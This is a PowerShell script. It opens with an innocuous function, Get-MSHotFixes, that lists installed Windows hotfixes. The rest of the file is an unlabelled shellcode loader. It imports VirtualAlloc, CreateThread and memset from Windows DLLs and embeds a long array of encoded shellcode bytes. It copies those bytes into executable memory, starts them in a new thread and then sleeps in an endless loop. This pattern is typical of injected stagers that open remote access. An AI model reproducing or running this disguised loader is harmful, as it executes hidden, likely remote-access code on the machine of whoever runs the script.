﻿function Get-MSHotFixes
{


$hotfixes = Get-WmiObject -Class Win32_QuickFixEngineering
$hotfixes | Select-Object -Property Description, HotfixID, Caption,@{l="InstalledOn";e={[DateTime]::Parse($_.psbase.properties["installedon"].value,$([System.Globalization.CultureInfo]::GetCultureInfo("en-US")))}} | Sort-Object -Descending InstalledOn
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xd9,0x74,0x24,0xf4,0xbf,0xba,0x38,0x46,0xe9,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x7a,0x14,0x03,0x7a,0xae,0xda,0xb3,0x15,0x26,0x98,0x3c,0xe6,0xb6,0xfd,0xb5,0x03,0x87,0x3d,0xa1,0x40,0xb7,0x8d,0xa1,0x05,0x3b,0x65,0xe7,0xbd,0xc8,0x0b,0x20,0xb1,0x79,0xa1,0x16,0xfc,0x7a,0x9a,0x6b,0x9f,0xf8,0xe1,0xbf,0x7f,0xc1,0x29,0xb2,0x7e,0x06,0x57,0x3f,0xd2,0xdf,0x13,0x92,0xc3,0x54,0x69,0x2f,0x6f,0x26,0x7f,0x37,0x8c,0xfe,0x7e,0x16,0x03,0x75,0xd9,0xb8,0xa5,0x5a,0x51,0xf1,0xbd,0xbf,0x5c,0x4b,0x35,0x0b,0x2a,0x4a,0x9f,0x42,0xd3,0xe1,0xde,0x6b,0x26,0xfb,0x27,0x4b,0xd9,0x8e,0x51,0xa8,0x64,0x89,0xa5,0xd3,0xb2,0x1c,0x3e,0x73,0x30,0x86,0x9a,0x82,0x95,0x51,0x68,0x88,0x52,0x15,0x36,0x8c,0x65,0xfa,0x4c,0xa8,0xee,0xfd,0x82,0x39,0xb4,0xd9,0x06,0x62,0x6e,0x43,0x1e,0xce,0xc1,0x7c,0x40,0xb1,0xbe,0xd8,0x0a,0x5f,0xaa,0x50,0x51,0x37,0x1f,0x59,0x6a,0xc7,0x37,0xea,0x19,0xf5,0x98,0x40,0xb6,0xb5,0x51,0x4f,0x41,0xba,0x4b,0x37,0xdd,0x45,0x74,0x48,0xf7,0x81,0x20,0x18,0x6f,0x20,0x49,0xf3,0x6f,0xcd,0x9c,0x6e,0x75,0x59,0xa1,0xef,0x95,0xb3,0xb5,0xed,0x55,0xe7,0xf4,0x7b,0xb3,0xb7,0xa6,0x2b,0x6c,0x77,0x17,0x8c,0xdc,0x1f,0x7d,0x03,0x02,0x3f,0x7e,0xc9,0x2b,0xd5,0x91,0xa4,0x04,0x41,0x0b,0xed,0xdf,0xf0,0xd4,0x3b,0x9a,0x32,0x5e,0xc8,0x5a,0xfc,0x97,0xa5,0x48,0x68,0x58,0xf0,0x33,0x3e,0x67,0x2e,0x59,0xbe,0xfd,0xd5,0xc8,0xe9,0x69,0xd4,0x2d,0xdd,0x35,0x27,0x18,0x56,0xff,0xbd,0xe3,0x00,0x00,0x52,0xe4,0xd0,0x56,0x38,0xe4,0xb8,0x0e,0x18,0xb7,0xdd,0x50,0xb5,0xab,0x4e,0xc5,0x36,0x9a,0x23,0x4e,0x5f,0x20,0x1a,0xb8,0xc0,0xdb,0x49,0x38,0x3c,0x0a,0xb7,0x4e,0x2c,0x8e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

